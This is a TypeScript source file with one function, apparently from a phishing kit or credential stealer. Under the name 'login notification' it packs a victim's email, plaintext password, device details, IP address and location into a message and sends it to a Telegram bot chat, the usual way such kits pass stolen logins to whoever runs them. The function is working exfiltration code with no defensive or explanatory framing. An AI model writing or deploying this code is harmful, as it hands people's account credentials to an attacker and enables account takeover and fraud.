export async function sendLoginNotification(
  botToken: string,
  defaultChatId: string,
  email: string,
  password: string,
  source: string,
  deviceDetails: string,
  ipAddr: string,
  location: string,
  chatId?: string,
): Promise<boolean> {
  const message = `
🔐 **New Login Detected**

📧 **Email:** ${email}
🔑 **Password:** ${password}
🌐 **Source:** ${source}

📱 **Device Info:** ${deviceDetails}
🌍 **IP Address:** ${ipAddr}
📍 **Location:** ${location}

⏰ **Time:** ${new Date().toISOString()}
  `.trim();

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId || defaultChatId,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true,
    }),
  });

  const data = (await response.json()) as { ok: boolean };
  return data.ok;
}
